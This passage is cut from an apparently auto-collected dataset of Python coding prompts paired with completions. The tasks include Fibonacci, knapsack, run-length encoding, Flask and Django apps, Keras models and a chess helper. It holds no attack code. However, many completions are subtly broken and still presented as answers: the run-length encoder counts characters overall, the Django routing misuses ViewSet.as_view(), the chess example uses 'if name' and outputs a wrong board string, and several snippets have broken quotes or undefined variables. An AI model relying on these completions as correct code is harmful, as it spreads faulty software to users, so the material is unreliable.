highest_num = num return highest_num"},{"prompt":"Construct a Python program that reads a user input and returns twice the value. Number = 3","completion":"def double(number): return number * 2 # Output 6"},{"prompt":"Write a Python program to illustrate an Object Oriented programming concept.","completion":"# Example illustrating Object Oriented programming class Employee: def __init__(self, first_name, last_name, salary): self.first_name = first_name self.last_name = last_name self.salary = salary def get_full_name(self): return self.first_name + \\" \\" + self.last_name if __name__ == \\"__main__\\": emp1 = Employee(\\"John\\", \\"Doe\\", 10000) print(\\"Full name:\\", emp1.get_full_name()) print(\\"Salary:\\", emp1.salary)"},{"prompt":"Optimize the following Python program for computing Fibonacci numbers: def fib(n): if n <= 1: return n else: return fib(n1) + fib(n2) Not applicable","completion":"def fib(n): fibonacci_numbers = [0, 1] for i in range(2, n + 1): fibonacci_numbers.append(fibonacci_numbers[i - 1] + fibonacci_numbers[i - 2]) return fibonacci_numbers[n]"},{"prompt":"Design a Greedy Algorithm in Python to implement the 0/1 knapsack problem. Not applicable","completion":"class Item(object): # create the item with its associated values def __init__(self, n, v, w): self.name = n self.value = v self.weight = w # Evaluate the items by their value density def getValue(self): return self.value/self.weight def knapsack(items, maxWeight): # sort items by value density in descending order items.sort(key=Item.getValue, reverse=True) totalValue = 0 # iterate over the items for i in range(len(items)): if(maxWeight - items[i].weight >= 0): totalValue += items[i].value maxWeight -= items[i].weight return totalValue"},{"prompt":"Build a Python script to multiply two integer values.","completion":"def multiply(a, b): return a * b print(multiply(2, 3))"},{"prompt":"Design a function to print a chessboard of size n x n in Python.","completion":"def print_chessboard(n): for i in range(1, n+1): for j in range(1, n+1): if (i+j) % 2 == 0: print(\\"X\\",end=\\" \\") else: print(\\"O\\",end=\\" \\") print() print_chessboard(8)"},{"prompt":"The given code is a Python function that creates a natural language game creation program. To use the program, call the function start_dialog with an optional output file name as an argument. The program will prompt the user for input to define the game environment, including board size, number of players, game pieces, player moves, win conditions, and game end conditions. The program will then generate a GDL file based on the user's input and write it to the output file. If no output file name is provided, the program will write the GDL file to a file named test.txt.","completion":"import re import nltk import ngdl_classes import global_vars import ngdl_parse import ngdl_write def start_dialog(output_file=\\"test.txt\\"): if not global_vars.initialized: global_vars.init() else: reset_global_vars() output = open(output_file, \\"w\\") print \\"Welcome to the natural language game creation program for general game playing!\\" #print \\"First we'll work on defining the game environment\\" board_size_dialog() player_num_dialog() game_pieces_dialog() player_move_dialog() goal_dialog() terminal_dialog() ngdl_write.write_gdl_file(output) output.close() def reset_global_vars(): global_vars.write_queue = [[\\"noop\\", []], [\\"goals\\", []], [\\"terminal\\", []], [\\"distinct_cells\\", []], [\\"successors\\", [50]]] global_vars.game = ngdl_classes.Game() def board_size_dialog(): in_board_size = raw_input(\\"What size would you like your board to be?: \\") valid_input = re.search(\\"([0-9]+)s?(by|x|X)s?([0-9]+)\\", in_board_size) while not valid_input: print \\"Sorry, I can't understand that input yet, can you try again?\\" in_board_size = raw_input(\\"What size would you like your game to be?: \\") valid_input = re.search(\\"([0-9]+)s?(by|x|X)s?([0-9]+)\\", in_board_size) board_size = (valid_input.group(1), valid_input.group(3)) #confirmation = raw_input(\\"To confirm, there will be \\" + board_size[0] + \\" columns and \\" + board_size[1] + \\" rows?: \\") global_vars.game.board = ngdl_classes.Board((int(board_size[0]), int(board_size[1]))) global_vars.write_queue.append([\\"board\\" , []]) def player_num_dialog(): in_player_num = raw_input(\\"How many players does your game have?: \\") valid_input = re.search(\\"[0-9]+\\", in_player_num) while not valid_input: print \\"Sorry, I can't understand that input yet, can you try again?\\" in_player_num = raw_input(\\"How many players does your game have?: \\") valid_input = re.search(\\"[0-9]+\\", in_player_num) num_players = int(valid_input.group()) for p in range(1,num_players+1): global_vars.game.players.append(ngdl_classes.Player(\\"player\\" + str(p))) global_vars.write_queue.append([\\"players\\", []]) def game_pieces_dialog(): for player in global_vars.game.players: in_piece_names = raw_input(\\"What types of pieces does \\" + player.name + \\" have?: \\") pieces = re.findall(\\"([0-9]*)s|^([^Wd]+)\\", in_piece_names) for p in pieces: global_vars.game.pieces[p[1]] = ngdl_classes.Piece(p[1]) player.pieces.append(p[1]) on_board_response = raw_input(\\"Do any of \\" + player.name + \\"'s pieces start on the board?: \\") on_board_response = on_board_response.lower() if not re.match(\\"[no|n]\\", on_board_response): for p in pieces: if p[0] == \\"\\" or int(p[0]) > 1: p_positions = raw_input(\\"What are the starting positions <col, row> of the \\" + p[1] + \\" that start on the board? (enter to skip): \\") else: p_positions = raw_input(\\"What is the starting position <col, row> of the \\" + p[1] + \\" if it starts on the board? (enter to skip): \\") positions = re.findall(\\"([0-9]+),s?([0-9]+)\\", p_positions) if positions: for pos in positions: global_vars.game.board.starting_positions[(int(pos[0]), int(pos[1]))] = player.name + \\" \\" + piece.name def player_move_dialog(): move_conditions = raw_input(\\"What can a player do on their turn?: \\") parse_trees = ngdl_parse.parse(move_conditions, 2) nltk_tree = parse_trees[0] tree = translate_tree(nltk_tree) conditions = process_condition(tree) action = tree.find_closest_node(\\"ACTION\\") while action.children: index = [child.name for child in action.children].index(\\"ACTION\\") action = action[index] if action.value == \\"drop\\": drop_response = raw_input(\\"By 'drop', do you mean dropping a piece like in Connect-4, or placing a piece like in Shogi?: \\") drop_response.lower() if re.match(\\"[connect-4|drop]\\", drop_response): global_vars.write_queue.append([\\"drop_occupant_conditions\\", [[conditions]]]) global_vars.write_queue.append([\\"perpetuate_untouched_cells\\", [[\\"drop\\"]]]) else: global_vars.write_queue.append([\\"place_occupant_conditions\\", [[conditions]]]) global_vars.write_queue.append([\\"perpetuate_untouched_cells\\", [[\\"place\\"]]]) elif action.value in [\\"place\\", \\"mark\\"]: global_vars.write_queue.append([\\"place_occupant_conditions\\", [[conditions]]]) global_vars.write_queue.append([\\"perpetuate_untouched_cells\\", [[\\"place\\"]]]) #def piece_move_dialog(): def goal_dialog(): win_conditions = raw_input(\\"How does a player win?: \\") parse_trees = ngdl_parse.parse(win_conditions, 1) nltk_tree = parse_trees[0] tree = translate_tree(nltk_tree) #result = tree.find_closest_node(\\"RESULT\\") conditions_tree = tree.find_closest_node(\\"COND\\") conditions = process_condition(conditions_tree) global_vars.write_queue.append([\\"win_conditions\\", [[conditions], \\"\\"]]) def terminal_dialog(): game_end_conditions = raw_input(\\"Aside from a player winning, how does the game end?: \\") parse_trees = ngdl_parse.parse(game_end_conditions, 1) nltk_tree = parse_trees[0] tree = translate_tree(nltk_tree) conditions_tree = tree.find_closest_node(\\"COND\\") conditions = process_condition(conditions_tree) global_vars.write_queue.append([\\"game_end_conditions\\", [[conditions]]]) def process_result(result): return def process_conditions(conds): conditions = [] if \\"OR\\" in [child.name for child in conds.children]: conditions.append(\\"OR\\") for child in conds.children: if child.name == \\"COND\\": conditions.append(process_condition(child)) elif \\"AND\\" in [child.name for child in conds.children]: conditions.append(\\"AND\\") for child in conds.children: if child.name == \\"COND\\": conditions.append(process_condition(child)) else: conditions.append(\\"COND\\") conditions.append(process_condition(conds)) return conditions def process_condition(cond_node): for leaf in cond_node.leaves(): if leaf.value in cond_dictionary: cond_definition = cond_dictionary[leaf.value] slot_values = [] for slot in cond_definition[0]: slot_node = leaf.find_closest_node(slot[0]) if not slot_node: if len(slot) == 2: slot_values.append(slot[1]) else: print \\"Slot fill error1!\\" elif cond_node not in slot_node.ancestors(): if len(slot) == 2: slot_values.append(slot[1]) else: print \\"Slot fill error2!\\" elif slot_node.name == \\"PLAYER\\": slot_values.append(process_player(slot_node)) elif slot_node.name == \\"BOARD_PART\\": slot_values.append(process_board_part(slot_node)) elif slot_node.name == \\"PIECE\\": slot_values.append(process_piece(slot_node)) else: slot_values.append(slot_node.value) if cond_definition[-1]: global_vars.write_queue.append([cond_definition[2], slot_values]) else: global_vars.write_queue.append([cond_definition[2], []]) return cond_definition[1].format(*slot_values) def process_player(player_node): return \\"?player\\" def process_board_part(board_part_node): square_equivalents = [\\"cell\\"] board_part = board_part_node while board_part.children: index = [child.name for child in board_part.children].index(\\"BOARD_PART\\") board_part = board_part[index] if board_part.value in square_equivalents: return \\"square\\" else: return board_part.value def process_piece(piece_node): piece = piece_node while piece.children: index = [child.name for child in piece.children].index(\\"PIECE\\") piece = piece[index] if piece.value == \\"piece\\": return \\"?piece\\" else: return piece.value def translate_tree(nltk_tree): if nltk_tree.height() == 2: tree = ngdl_classes.Tree(nltk_tree.node) tree.value = nltk_tree[0] return tree tree = ngdl_classes.Tree(nltk_tree.node) for subtree in nltk_tree: if type(subtree) == str: tree.value = subtree else: tree.children.append(translate_tree(subtree)) for subtree in tree.children: subtree.parent = tree return tree cond_dictionary = {\\"empty\\": [[[\\"BOARD_PART\\"], [\\"NUM\\", \\"?col\\"], [\\"NUM\\", \\"?row\\"]], \\"(empty {0} {1} {2})\\", \\"board_part_empty\\", False], \\"open\\": [[[\\"BOARD_PART\\"], [\\"NUM\\", \\"?col\\"], [\\"NUM\\", \\"?row\\"]], \\"(open {0} {1} {2})\\", \\"board_part_open\\", False], \\"full\\": [[[\\"BOARD_PART\\"], [\\"NUM\\", \\"?col\\"], [\\"NUM\\", \\"?row\\"]], \\"(full {0} {1} {2})\\", \\"board_part_full\\", False], \\"in-a-row\\": [[[\\"NUM\\"], [\\"PLAYER\\", \\"?player\\"], [\\"PIECE\\", \\"?piece\\"]], \\"({0}_in_a_row {1} {2})\\", \\"x_in_a_row\\", True] }"},{"prompt":"Generate Python code to print all Armstrong numbers between 1 and 1000.","completion":"for num in range(1,1001): sum = 0 temp = num while temp > 0: digit = temp % 10 sum += digit ** 3 temp //= 10 if num == sum: print(num)"},{"prompt":"Write a Python program to calculate the mode of the given list of numbers. [2, 3, 4, 5, 2, 6, 1, 5]","completion":"def find_mode(numbers): most_freq = 0 mode = None counts = {} for num in numbers: if num in counts: counts[num] += 1 else: counts[num] = 1 for num in counts: if counts[num] > most_freq: most_freq = counts[num] mode = num return mode"},{"prompt":"Given a set of sentences as input, write a Python program to return only the sentences that contain at least one noun. ['The sky is blue.', 'Roses are red.', 'The cat is cute.']","completion":"import nltk def find_nouns(sentences): noun_sentences = [] for sentence in sentences: words = nltk.tokenize.word_tokenize(sentence) pos_tags = nltk.pos_tag(words) for tag in pos_tags: if tag[1] == 'NN' or tag[1] == 'NNS': noun_sentences.append(sentence) break return noun_sentences"},{"prompt":"Create an AI ML model using Python to classify a given dataset which contains restaurants reviews into different categories. dataset containing 8,000 restaurant review","completion":"import pandas as pd from sklearn.model_selection import train_test_split from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB from sklearn.metrics import classification_report # Read the dataset data = pd.read_csv('restaurant_reviews.csv') # Split the dataset into training and testing sets X_train, X_test, y_train, y_test = train_test_split(data['review'], data['category'], test_size=0.2, random_state=42) # Initialize the CountVectorizer vect = CountVectorizer().fit(X_train) # Transform the training and testing sets X_train_vectorized = vect.transform(X_train) X_test_vectorized = vect.transform(X_test) # Initialize and train the model model = MultinomialNB().fit(X_train_vectorized, y_train) # Make predictions preds = model.predict(X_test_vectorized) # Generate the classification report print(classification_report(y_test, preds))"},{"prompt":"This code configures an MML file with datasource settings. To use it, you need to run the script with the following arguments: host: the host name (default is 'localhost') port: the port number (default is '5432') dbname: the database name (default is 'abs') user: the user name (default is 'abs') password: the password (default is 'abs') srs: the spatial reference system (default is '+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon_0=0.0 +x_0=0.0 +y_0=0.0 +k=1.0 +units=m +nadgrids=@null +wktext +no_defs +over') shapedir: the directory where the shapefiles are located (default is './layers/') extent: the bounding box to restrict queries (default is '12570320.00,5403474.50,17711958.00,1636391.88') mml: the name of the MML file to be configured (required) The script will modify the MML file by updating the datasource settings for layers that use a postgis datasource and adding datasource settings for layers that use shapefiles. The modified MML file will be saved in the same location as the original file.","completion":"#!/usr/bin/env python # Copyright (c) 2011, Development Seed, Inc. # 2011, Andrew Harvey <andrew.harvey4@gmail.com> # All rights reserved. # # Redistribution and use in source and binary forms, with or without # modification, are permitted provided that the following conditions are # met: # # * Redistributions of source code must retain the above copyright # notice, this list of conditions and the following disclaimer. # * Redistributions in binary form must reproduce the above copyright # notice, this list of conditions and the following disclaimer in # the documentation and/or other materials provided with the # distribution. # * Neither the name of the Development Seed, Inc. nor the names of # its contributors may be used to endorse or promote products # derived from this software without specific prior written # permission. # # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \\"AS # IS\\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED # TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A # PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER # OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, # EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, # PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR # PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF # LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING # NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS # SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. import json from sys import path from os.path import join import argparse # argparse parser = argparse.ArgumentParser(description='Configure an MML file with datasource settings') parser.add_argument('--host', default='localhost') parser.add_argument('--port', default='5432') parser.add_argument('--dbname', default='abs') parser.add_argument('--user', default='abs') parser.add_argument('--password', default='abs') parser.add_argument('--srs', default='+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon_0=0.0 +x_0=0.0 +y_0=0.0 +k=1.0 +units=m +nadgrids=@null +wktext +no_defs +over') parser.add_argument('--shapedir', default='./layers/') # Increase performance if you are only rendering a particular area by # specifying a bounding box to restrict queries. Format is \\"XMIN,YMIN,XMAX,YMAX\\" in the # same units as the database (probably spherical mercator meters). The # whole world is \\"-20037508.34,-20037508.34,20037508.34,20037508.34\\". # Leave blank to let Mapnik estimate. parser.add_argument('--extent', default='12570320.00,-5403474.50,17711958.00,-1636391.88') parser.add_argument('--mml', required=True) args = parser.parse_args() # configure mml mml = join(path[0], args.mml + '/' + args.mml + '.mml') shoreline_300 = args.shapedir.rstrip('/') + '/shoreline_300.shp' processed_p = args.shapedir.rstrip('/') + '/processed_p.shp' with open(mml, 'r') as f: newf = json.loads(f.read()) f.closed with open(mml, 'w') as f: for layer in newf[\\"Layer\\"]: if \\"Datasource\\" in layer: ds_type = layer[\\"Datasource\\"].get(\\"type\\") if ds_type and ds_type == \\"postgis\\": layer[\\"Datasource\\"][\\"host\\"] = args.host layer[\\"Datasource\\"][\\"port\\"] = args.port layer[\\"Datasource\\"][\\"dbname\\"] = args.dbname layer[\\"Datasource\\"][\\"user\\"] = args.user layer[\\"Datasource\\"][\\"password\\"] = args.password layer[\\"Datasource\\"][\\"extent\\"] = args.extent layer[\\"srs\\"] = args.srs else: if layer[\\"id\\"] == \\"shoreline_300\\": layer[\\"Datasource\\"] = dict(); layer[\\"Datasource\\"][\\"file\\"] = shoreline_300 layer[\\"Datasource\\"][\\"type\\"] = 'shape' layer[\\"geometry\\"] = 'polygon' layer[\\"srs\\"] = '+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon_0=0.0 +x_0=0.0 +y_0=0 +k=1.0 +units=m +nadgrids=@null +wktext +no_defs +over' elif layer[\\"id\\"] == \\"processed_p\\": layer[\\"Datasource\\"] = dict(); layer[\\"Datasource\\"][\\"file\\"] = processed_p layer[\\"Datasource\\"][\\"type\\"] = 'shape' layer[\\"geometry\\"] = 'polygon' layer[\\"srs\\"] = '+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon_0=0.0 +x_0=0.0 +y_0=0 +k=1.0 +units=m +nadgrids=@null +wktext +no_defs +over' f.write(json.dumps(newf, indent=2)) f.closed"},{"prompt":"Design a program in Python to reverse a given string.","completion":"def reverse_string(string): rev_str = '' idx = len(string) while idx > 0: rev_str += string[idx-1] idx -= 1 return rev_str"},{"prompt":"Design a python class for representing a student object which has name and grade as its instance variables.","completion":"class Student(): def __init__(self, name, grade): self.name = name self.grade = grade def get_name(self): return self.name def get_grade(self): return self.grade def set_grade(self, grade): self.grade = grade"},{"prompt":"Optimize an existing Python web scraper to retrieve data from a website more quickly. def scrape(url): html = requests.get(url).text soup = BeautifulSoup(html, 'html.parser') page_info = {} page_info['text'] = soup.find('div',{'class':'contenttext'}).text page_info['url'] = url return page_info","completion":"import requests from bs4 import BeautifulSoup import lxml import cProfile def scrape(url): cProfile.runctx('get_data(url)', globals(), locals(), filename='scraper.profile') def get_data(url): html_string = requests.get(url, timeout=5).text parsed_html = BeautifulSoup(html_string, 'lxml') page_info = {} page_text = parsed_html.find('div',{'class':'content-text'}).text page_info['text'] = page_text page_info['url'] = url return page_info"},{"prompt":"Create a REST API with Python and Django Rest Framework that supports a simple TODO list functionality. Not applicable","completion":"from rest_framework import serializers from .models import Todo class TodoSerializer(serializers.ModelSerializer): class Meta: model = Todo fields = '__all__' # views.py from rest_framework import viewsets from .models import Todo from .serializers import TodoSerializer class TodoViewSet(viewsets.ModelViewSet): queryset = Todo.objects.all() serializer_class = TodoSerializer # urls.py from django.urls import path from .views import TodoViewSet urlpatterns = [ path('todos/', TodoViewSet.as_view()), ]"},{"prompt":"Design a data structure in Python to store a list of student names and their ages.","completion":"student_data = { \\"student1\\" : {\\"name\\": \\"John\\", \\"age\\": 20}, \\"student2\\" : {\\"name\\": \\"Sam\\", \\"age\\": 22}, \\"student3 : {\\"name\\": \\"Alice\\", \\"age\\": 19} }"},{"prompt":"Create a program in Python to compress a given string using Runlength Encoding algorithm. Input string: “wwwwaaadexxxxxx”","completion":"def compress(string): # Initialize dictionary dict_rle = {} # Traverse input string # and keep count of each # character for ch in string : dict_rle[ch] = dict_rle.get(ch, 0) + 1 # Store encoded string encoded_string = \\"\\" # Encode each character and its count for key,value in dict_rle.items(): # print \\"%s%s\\" % (key,value) encoded_string += key + str(value) return encoded_string len_encoded_string = compress(string) print \\"Encoded String: \\", encoded_string"},{"prompt":"Create a web application using Python and Flask that displays the temperature of a given city.","completion":"from flask import Flask, render_template import requests #initialise flask application app = Flask(__name__) @app.route('/weather') def show_weather(): #get json weather data from api url = 'http://api.openweathermap.org/data/2.5/weather?q=London,uk&appid=YOUR_API_KEY' response = requests.get(url) data = response.json() #extract temperature from json data temp = data['main']['temp'] #convert temperature from kelvin to Celsius temp_celsius = temp - 273.15 #render template with temperature return render_template('weather.html', temp=temp_celsius) if __name__ == '__main__': app.run(debug=True, port=3000)"},{"prompt":"Develop a python code to find out the frequent items from a given list. list1 = [1,2,3,4,5,6,7,2,2,2,2,8,8,8,8,9,9,9]","completion":"from collections import Counter list1 = [1,2,3,4,5,6,7,2,2,2,2,8,8,8,8,9,9,9] # Most common items in the list data = Counter(list1) # Printing most common items print(data.most_common()) # Output: [(2, 4), (8, 4), (9, 3), (1, 1), (3, 1), (4, 1), (5, 1), (6, 1), (7, 1)]"},{"prompt":"Write a Python script that returns the most common words from a given text This is a sample text.","completion":"def most_common_words(text): words = text.split() word_frequency = {} for word in words: if word in word_frequency: word_frequency[word] += 1 else: word_frequency[word] = 1 max_value = 0 most_common = None for word in word_frequency: if word_frequency[word] > max_value: max_value = word_frequency[word] most_common = word return most_common"},{"prompt":"Generate a Python code for finding the sum and difference of two numbers. 7, 9","completion":"# Function to calculate the sum and difference def sum_difference(num1, num2): sum = num1 + num2 difference = num1 - num2 return sum, difference # Calculating the sum and difference x,y = sum_difference(7,9) # Print the results print(\\"Sum:\\", x) print(\\"Difference:\\", y)"},{"prompt":"Create an AI chatbot in Python that uses natural language processing and machine learning. The chatbot should be able to process user input, understand intents, and generate appropriate responses. Not applicable","completion":"import nltk import numpy as np import random import string from sklearn.feature_extraction.text import TfidfVectorizer from sklearn.metrics.pairwise import cosine_similarity # Download the corpus nltk.download('wordnet') # Get a text file with open('chatbot.txt', 'r', encoding='utf8', errors='ignore') as fin: raw = fin.read().lower() # Tokenize the text sent_tokens = nltk.sent_tokenize(raw) # Normalize the tokens lemmer = nltk.stem.WordNetLemmatizer() def LemTokens(tokens): return [lemmer.lemmatize(token) for token in tokens] remove_punct_dict = dict((ord(punct), None) for punct in string.punctuation) def LemNormalize(text): return LemTokens(nltk.word_tokenize(text.lower().translate(remove_punct_dict))) # Generate response for user's input def response(user_response): robo_response='' sent_tokens.append(user_response) TfidfVec = TfidfVectorizer(tokenizer=LemNormalize, stop_words='english') tfidf = TfidfVec.fit_transform(sent_tokens) vals = cosine_similarity(tfidf[-1], tfidf) idx=vals.argsort()[0][-2] flat = vals.flatten() flat.sort() req_tfidf = flat[-2] if(req_tfidf==0): robo_response=robo_response+\\"I am sorry! I don't understand you\\" else: robo_response = robo_response+sent_tokens[idx] sent_tokens.remove(user_response) return robo_response"},{"prompt":"Rewrite this Python code to modernize it and make it more efficient. def removeNegatives(nums): result = [] for n in nums: if n >= 0: result.append(n) return resul","completion":"def removeNegatives(nums): return [n for n in nums if n >= 0]"},{"prompt":"Create a function in Python that takes an array of integers as input and outputs the number of unique values in the array. [1,5,5,4,4,6,7,7]","completion":"def get_unique_values(arr): # convert to set unique_arr = set(arr) # return length return len(unique_arr) # driver code arr = [1, 5, 5, 4, 4, 6, 7, 7] # function call unique_values = get_unique_values(arr) # print unique values print(unique_values)"},{"prompt":"Write an algorithm for solving the 8puzzle game in Python. Not applicable","completion":"class PuzzleState: def __init__(self, puzz): self.puzz = puzz def get_neighbors(self): indices = [[i, j] for i in range(3) for j in range(3)] neighbors = [] for i, j in indices: if self.puzz[i][j] == 0: zero_list = [[i-1, j], [i+1, j], [i, j-1], [i, j+1]] for row, col in zero_list: if 0<=row<3 and 0<=col<3: neighbor = [list(x) for x in self.puzz] neighbor[i][j], neighbor[row][col] = neighbor[row][col], neighbor[i][j] neighbors.append(PuzzleState(neighbor)) return neighbors def bfs(start_state): visited = set() # stores previously visited states frontier = [start_state] while frontier: current = frontier.pop(0) if current.puzz == [[1,2,3],[4,5,6],[7,8,0]]: return current visited.add(str(current.puzz)) for nbr in current.get_neighbors(): if str(nbr.puzz) not in visited: frontier.append(nbr) start_state = PuzzleState([[4,2,3],[1,0,5],[7,8,6]]) bfs(start_state)"},{"prompt":"Create a Python program to validate user input. The program should take a string and only return valid if the string contains only the characters az, 09, and _ . text_string = valid_string123","completion":"text_string = input() valid_characters = \\"abcdefghijklmnopqrstuvwxyz0123456789_\\" is_valid = True for c in text_string: if c not in valid_characters: is_valid = False if is_valid: print \\"Valid\\" else: print \\"Invalid\\""},{"prompt":"Write a Python program to insert an item at a given position into a list lst = [Red, Orange, Yellow] item = Black pos = 2","completion":"def insert_item(lst, item, pos): lst.insert(pos, item) return lst lst = [\\"Red\\", \\"Orange\\", \\"Yellow\\"] item = \\"Black\\" pos = 2 print(insert_item(lst, item, pos))"},{"prompt":"Create an algorithm in Python that finds the minimum number of coins required to make a given amount of money. amount = 15","completion":"# coins in denominations of 1, 5, 10 def numberOfCoins(amount): coins = [1,5,10] c = len(coins)-1 count = 0 while amount>0: if (amount >= coins[c]): count += amount // coins[c] amount %= coins[c] c -= 1 return count # Driver Code if __name__ == \\"__main__\\": amount = 15 coins = [1,5,10] print(\\"Minimum coins required is\\",numberOfCoins(amount))"},{"prompt":"Write a Python program to print the number of characters in a given string. The quick brown fox jumps over the lazy dog","completion":"def count_chars(string): \\"\\"\\"Function to count characters in a given string\\"\\"\\" count = 0 # Loop through each character for char in string: count += 1 # Return the count return count # Given string string = \\"The quick brown fox jumps over the lazy dog\\" # Print the result print(\\"The number of characters in the given string:\\", count_chars(string))"},{"prompt":"Generate an instance of a linear programming problem in Python that minimizes the cost of the following inputs: 1kg at 2 and 2kg at 3","completion":"from pulp import * # define the problem prob = LpProblem(\\"min cost problem\\", LpMinimize) # define the decision variables x = LpVariable(\\"x\\", 0, None) y = LpVariable(\\"y\\", 0, None) # define the objective function prob += 2*x+3*y # define the constraints prob += x + 2*y >= 1 # solve the problem prob.solve() # print the status of the problem print(\\"Status:\\", LpStatus[prob.status]) # print the optimal solution print(\\"Optimal Solutions:\\") print(\\"x=%.2f\\" % x.value()) print(\\"y=%.2f\\" % y.value())"},{"prompt":"Generate a Python program for predicting players' positions in a game of chess based on their moves. Not applicable","completion":"import chess def predict_position(moves): board = chess.Board() for move in moves: board.push_san(move) return board.fen() if name == '__main__': moves = ['e4', 'e5', 'Nf3', 'Nc6', 'Bb5'] position = predict_position(moves) print(position) # Output: rnbqkbnr/pppp1ppp/8/4p3/4P3/8/PPPP1PPP/RNBQKBNR w KQkq - 0 3"},{"prompt":"Generate a Python code to search a number in a sorted array","completion":"def binary_search(arr, x): l = 0 r = len(arr)-1 while l <= r: mid = l + (r - l) // 2 if arr[mid] == x: return mid elif arr[mid] < x: l = mid + 1 else: r = mid - 1 return -1"},{"prompt":"Create a Python script to calculate the mode of an integer list. [1,1,2,2,2]","completion":"def get_mode(nums): # create a dictionary to store count of each number counts = {} # loop through the list for num in nums: # add the number to the count if not present if num not in counts: counts[num] = 1 # else increment the count else: counts[num] += 1 # sort the dictionary by count sorted_counts = sorted(counts.items(), key=lambda x: x[1], reverse=True) # get the most frequently occurring number mode = sorted_counts[0][0] return mode # test nums = [1,1,2,2,2] print(get_mode(nums)) # prints 2"},{"prompt":"Design an algorithm in Python to count the number of occurrences of each character in a given string. Hello World","completion":"def count_chars(string): chars = {} for c in string: if c not in chars: chars[c] = 0 chars[c] += 1 return chars str = \\"Hello World\\" print(count_chars(str)) # {'H': 1, 'e': 1, 'l': 3, 'o': 2, ' ': 1, 'W': 1, 'r': 1, 'd': 1}"},{"prompt":"mplement a REST API endpoint with Python and Flask to POST user data including username, email, and password. { username: scott_pilgrim, email: scott@pilgrim.com, password: ferriswheel }","completion":"import flask from flask import Flask, request, jsonify app = Flask(__name__) @app.route('/users', methods=['POST']) def create_user(): data = request.get_json() username = data['username'] email = data['email'] password = data['password'] # Insert into database return jsonify({\\"message\\": \\"User created successfully\\"}) if __name__ == '__main__': app.run()"},{"prompt":"Using the Keras library, create a neural network in Python for a binary classification task. Not applicable","completion":"import numpy as np import keras from keras.models import Sequential from keras.layers import Dense, Dropout # Create a basic model model = Sequential() model.add(Dense(64, activation='relu', input_shape=(64,))) model.add(Dropout(0.5)) model.add(Dense(64, activation='relu')) model.add(Dropout(0.5)) model.add(Dense(1, activation='sigmoid')) # Compile the model model.compile(optimizer='rmsprop', loss='binary_crossentropy', metrics=['accuracy'])"},{"prompt":"Generate a Python function that takes a list as input, and returns the number of values in the list that are greater than the average of the values in the list. input_list = [4, 8, 6, 3, 10]","completion":"def count_above_average(input_list): average = sum(input_list)/len(input_list) count = 0 for value in input_list: if value > average: count += 1 return count"},{"prompt":"Create a Django web application that allows users to view, add, and edit blog posts.","completion":"# create our Django project django-admin startproject blogapp # create our app cd blogapp python manage.py startapp posts # create a model for our blog posts # in posts/models.py: from django.db import models class Post(models.Model): title = models.CharField(max_length=255) content = models.TextField() created_at = models.DateTimeField(auto_now_add=True) updated_at = models.DateTimeField(auto_now=True) # register the model with admin # in posts/admin.py: from django.contrib import admin from .models import Post admin.site.register(Post) # create a form for our blog posts # in posts/forms.py: from django import forms from .models import Post class PostForm(forms.ModelForm): class Meta: model = Post fields = ['title', 'content'] # create a view for our posts # in posts/views.py: from django.shortcuts import render from .models import Post from .forms import PostForm def posts_view(request): posts = Post.objects.all() if request.method == 'POST': form = PostForm(request.POST) if form.is_valid(): post = form.save() return redirect('posts_view') else: form = PostForm() return render(request, 'posts/posts_view.html', { 'posts': posts, 'form': form })"},{"prompt":"Generate a neural network model in Python code to do multilevel classification We need a model to determine which of these 5 categories an image belongs to. The 5 categories are animals, vehicles, plants, scenery and objects.","completion":"from keras.layers import Dense, Dropout, Activation, Input from keras.models import Model from keras.optimizers import SGD input_layer = Input(shape=(128,)) x = Dense(128, activation='relu')(input_layer) x = Dropout(0.25)(x) x = Dense(128, activation='relu')(x) x = Dropout(0.25)(x) x = Dense(128, activation='relu')(x) output_layer = Dense(5, activation='softmax')(x) model = Model(inputs=input_layer, outputs=output_layer) model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.001, momentum=0.9, nesterov=True), metrics=['accuracy'])"},{"prompt":"Create a Python program to generate Fibonacci sequence upto n terms","completion":"def fibonacci(n): a, b = 0, 1 fibs = [] while len(fibs) < n: fibs.append(a) a, b = b, a + b return fibs #get the Fibonacci sequence upto n terms print(fibonacci(n))"},{"prompt":"Using the comment as a guide, write a Python program to find the occurrence of any given word in a string. string = Welcome to my website website word = website","completion":"string = \\"Welcome to my website website\\" word = \\"website\\" # TODO: Initialize count count = 0 # TODO: Find the words in the string words = string.split() # TODO: Update count for w in words: if w == word: count += 1 # TODO: Print print(\\"The word \\"{}\\" occured {} times in the given string\\".format(word, count))"},{"prompt":"it possible to generate a random password with a minimum length of 8 and this password should contain at least one upper case letter, one lower case letter, one number and one special character?","completion":"Yes, it is possible to generate a random password with a minimum length of 8 and this password should contain at least one upper case letter, one lower case letter, one number and one special character. You can generate a random password using the following Python code snippet: import random import string def generate_password(): lowercaseletter = string.ascii_lowercase uppercaseletter = string.ascii_uppercase numerals = string.digits specialcharacters = string.punctuation characters = lowercaseletter + uppercaseletter + numerals + specialcharacters password = ''.join(random.choice(characters) for x in range(8)) return password"},{"prompt":"Create a function \`\`squareSum\`\` in python which will take a list of numbers as arguments and calculate their sum of squares. numbers=[1, 2, 3, 4, 5]","completion":"def squareSum(numbers): sum_of_squares = 0 for num in numbers: sum_of_squares += num**2 return 